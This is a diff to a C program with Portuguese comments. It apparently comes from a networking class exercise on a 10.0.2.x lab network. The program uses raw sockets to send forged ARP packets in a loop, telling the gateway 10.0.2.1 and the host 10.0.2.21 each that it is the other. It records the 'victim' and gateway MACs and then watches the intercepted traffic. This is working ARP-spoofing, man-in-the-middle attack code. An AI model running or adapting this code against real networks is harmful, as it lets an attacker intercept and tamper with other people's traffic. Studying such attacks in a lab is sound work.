@@ -25,6 +25,7 @@ int main(int argc, char *argv[])
 	char ifname[IFNAMSIZ];
 	char orig_ip[] = {10, 0, 2, 20};
 
+
 	//send
 	struct ifreq if_idx;
 	struct ifreq if_mac;
@@ -50,6 +51,16 @@ int main(int argc, char *argv[])
 	unsigned char mac_host[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
 
 
+int i = 1;
+
+
+
+while(1){
+
+frame_len =0;
+
+
+	//Prepara socket para receber do 10.0.2.1
 	if (argc != 2) {
 		printf("Usage: %s iface\n", argv[0]);
 		return 1;
@@ -85,7 +96,8 @@ int main(int argc, char *argv[])
 
 	
 
-
+	//Prepara socket para enviar para 10.0.2.1
+	
 	//send
 	/* Cria um descritor de socket do tipo RAW */
 	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
@@ -173,8 +185,7 @@ int main(int argc, char *argv[])
 
 
 
-int i = 1;
-int j = 1;
+
 
 
 		unsigned char *reply;	
@@ -185,11 +196,9 @@ int j = 1;
 		short int ethertype2 = 0;
 		short int oprecieve = 0;
 		
-		//envia pacotes
-		//printf("IP: %d.%d.%d.%d\t  1 \n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
+		//envia pacotes para o 10.0.2.1 como se eu fosse o 10.0.2.21
 		memcpy(buffer + frame_len, target_ip, sizeof(target_ip));
 		frame_len += sizeof(target_ip);
-		//printf("IP: %d.%d.%d.%d\t  2 \n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
 		if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *)&socket_address, sizeof(struct sockaddr_ll)) < 0)
 		{
 			perror("send");
@@ -201,8 +210,9 @@ int j = 1;
 	printf("Pacote enviado3.\n \n \n");
 	
 	
-	
-		printf("Esperando pacotes ... \n");
+		//Recebe Pacotes resposta do 10.0.2.1
+
+		//printf("Esperando pacotes ... \n");
 		/* Recebe pacotes */
 		if (recv(fd,(char *) &buffer, BUFFER_SIZE, 0) < 0) {
 			perror("recv");
@@ -225,12 +235,12 @@ int j = 1;
 		memcpy(ip_dst, reply+24, sizeof(ip_dst));
 		
 		if ((ethertype2 == ETHERTYPE && oprecieve == 2)
-			&& (21 == ip_dst[3]))
-			//&& (orig_ip[0] == ip_dst[0] && orig_ip[1] == ip_dst[1] && orig_ip[2] == ip_dst[2] && orig_ip[3] == ip_dst[3])) 
+			&& (21 == ip_dst[3]) && i == 1) 
 		{
 			printf("IP: %d.%d.%d.%d\t", ip_src[0], ip_src[1], ip_src[2], ip_src[3]);
 			printf("MAC origem:  %02x:%02x:%02x:%02x:%02x:%02x\n", 
                         mac_src[0], mac_src[1], mac_src[2], mac_src[3], mac_src[4], mac_src[5]);
+			printf("\n");
 			printf("\n");
 			mac_router[0] = mac_src[0];
 			mac_router[1] = mac_src[1];
@@ -241,10 +251,11 @@ int j = 1;
 		}
 		
 
+
 char sender_ip2[] = {10, 0, 2, 1};
 frame_len =0;
 
-
+//Prepara socket para receber do 10.0.2.21
 	if (argc != 2) {
 		printf("Usage: %s iface\n", argv[0]);
 		return 1;
@@ -282,7 +293,7 @@ frame_len =0;
 
 
 
-
+	//Prepara socket para enviar para o 10.0.2.21
 	//send
 	/* Cria um descritor de socket do tipo RAW */
 	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
@@ -384,11 +395,9 @@ frame_len =0;
 		
 		
 		
-		//envia pacotes
-		//printf("IP: %d.%d.%d.%d\t  1 \n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
+		//envia pacotes para o 10.0.2.21 como se eu fosse o 10.0.2.1
 		memcpy(buffer + frame_len, target_ip2, sizeof(target_ip2));
 		frame_len += sizeof(target_ip2);
-		//printf("IP: %d.%d.%d.%d\t  2 \n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
 		if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *)&socket_address, sizeof(struct sockaddr_ll)) < 0)
 		{
 			perror("send");
@@ -397,18 +406,17 @@ frame_len =0;
 		}
 
 		frame_len -= sizeof(target_ip2);
-	printf("Pacote enviado3.\n \n \n");
+		printf("Pacote enviado3.\n \n \n");
 	
 	
-	
-		printf("Esperando pacotes ... \n");
+		//Recebe reply do 10.0.2.21
+		//printf("Esperando pacotes ... \n");
 		/* Recebe pacotes */
 		if (recv(fd,(char *) &buffer, BUFFER_SIZE, 0) < 0) {
 			perror("recv");
 			close(fd);
 			exit(1);
 		}
-        printf("teste");
 		/* Copia o conteudo do cabecalho Ethernet */
 		memcpy(mac_dst2, buffer, sizeof(mac_dst2));
 		memcpy(mac_src2, buffer+sizeof(mac_dst2), sizeof(mac_src2));
@@ -424,13 +432,12 @@ frame_len =0;
 		memcpy(ip_dst2, reply2+24, sizeof(ip_dst2));
 		
 		if ((ethertype3 == ETHERTYPE && oprecieve2 == 2)
-			&& (1 == ip_dst2[3]))
-			//&& (orig_ip[0] == ip_dst[0] && orig_ip[1] == ip_dst[1] && orig_ip[2] == ip_dst[2] && orig_ip[3] == ip_dst[3])) 
+			&& (1 == ip_dst2[3]) && i == 1) 
 		{
-			printf("linha 286 \n");
 			printf("IP: %d.%d.%d.%d\t", ip_src2[0], ip_src2[1], ip_src2[2], ip_src2[3]);
 			printf("MAC origem:  %02x:%02x:%02x:%02x:%02x:%02x\n", 
                         mac_src2[0], mac_src2[1], mac_src2[2], mac_src2[3], mac_src2[4], mac_src2[5]);
+			printf("\n");
 			printf("\n");
 			mac_host[0] = mac_src2[0];
 			mac_host[1] = mac_src2[1];
@@ -440,17 +447,11 @@ frame_len =0;
 			mac_host[5] = mac_src2[5];
 		}
 			
-		/*target_ip[3] = 78;
-		target_ip[2] = 15;
-		target_ip[1] = 168;
-		target_ip[0] = 192;
-		printf("entrei \n");
-		printf("IP: %d.%d.%d.%d\t  3 \n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
-		*/
 		
 
 
-
+if(i==1){
+	//Printa os Macs das máquinas vitimas uma vez
 printf("MAC Gateway:  %02x:%02x:%02x:%02x:%02x:%02x\n", 
                         mac_router[0], mac_router[1], mac_router[2], mac_router[3], mac_router[4], mac_router[5]);
 printf("\n");
@@ -459,14 +460,87 @@ printf("MAC vitima:  %02x:%02x:%02x:%02x:%02x:%02x\n",
                         mac_host[0], mac_host[1], mac_host[2], mac_host[3], mac_host[4], mac_host[5]);
 
 printf("\n");
-			
+}	
 
 
 
-//inicio ataque
+//inicio da verificação de Pacotes enviados
+	
+	
+	
+	
+	//Printa IP e MAC da máquina que mandou um pacote
+	
+	
+	//Para quando for para a 10.0.2.21
+	if (recv(fd,(char *) &buffer, BUFFER_SIZE, 0) < 0) {
+			perror("recv");
+			close(fd);
+			exit(1);
+		}
+		/* Copia o conteudo do cabecalho Ethernet */
+		memcpy(mac_dst2, buffer, sizeof(mac_dst2));
+		memcpy(mac_src2, buffer+sizeof(mac_dst2), sizeof(mac_src2));
+		memcpy(&ethertype3, buffer+sizeof(mac_dst2)+sizeof(mac_src2), sizeof(ethertype3));
+		ethertype3 = ntohs(ethertype3);
+		reply2 = (buffer+sizeof(mac_dst2)+sizeof(mac_src2)+sizeof(ethertype3));
 
+		memcpy(&oprecieve2,reply2+6, sizeof(oprecieve2));
+		oprecieve2 = ntohs(oprecieve2);
+		
+		memcpy(ip_src2, reply2+14, sizeof(ip_src2));
 
+		memcpy(ip_dst2, reply2+24, sizeof(ip_dst2));
+		
+		if ((21 == ip_dst2[3])) 
+		{
+			printf("Máquina Destino: ");
+			printf("IP: %d.%d.%d.%d\t", ip_src2[0], ip_src2[1], ip_src2[2], ip_src2[3]);
+			printf("MAC origem:  %02x:%02x:%02x:%02x:%02x:%02x\n", 
+                        mac_src2[0], mac_src2[1], mac_src2[2], mac_src2[3], mac_src2[4], mac_src2[5]);
+			printf("\n");
+			printf("\n");
+		}
+		
+		
+		
+		
+		
+		//Para quando for para a 10.0.2.1	
+		if (recv(fd,(char *) &buffer, BUFFER_SIZE, 0) < 0) {
+			perror("recv");
+			close(fd);
+			exit(1);
+		}
+		/* Copia o conteudo do cabecalho Ethernet */
+		memcpy(mac_dst2, buffer, sizeof(mac_dst2));
+		memcpy(mac_src2, buffer+sizeof(mac_dst2), sizeof(mac_src2));
+		memcpy(&ethertype3, buffer+sizeof(mac_dst2)+sizeof(mac_src2), sizeof(ethertype3));
+		ethertype3 = ntohs(ethertype3);
+		reply2 = (buffer+sizeof(mac_dst2)+sizeof(mac_src2)+sizeof(ethertype3));
 
+		memcpy(&oprecieve2,reply2+6, sizeof(oprecieve2));
+		oprecieve2 = ntohs(oprecieve2);
+		
+		memcpy(ip_src2, reply2+14, sizeof(ip_src2));
+
+		memcpy(ip_dst2, reply2+24, sizeof(ip_dst2));
+		
+		if ((1 == ip_dst2[3])) 
+		{
+			printf("Máquina Destino: ");
+			printf("IP: %d.%d.%d.%d\t", ip_src2[0], ip_src2[1], ip_src2[2], ip_src2[3]);
+			printf("MAC origem:  %02x:%02x:%02x:%02x:%02x:%02x\n", 
+                        mac_src2[0], mac_src2[1], mac_src2[2], mac_src2[3], mac_src2[4], mac_src2[5]);
+			printf("\n");
+			printf("\n");
+		}
+	
+	
+	
+	i=0;
+	
+}
 
 
 	close(fd);
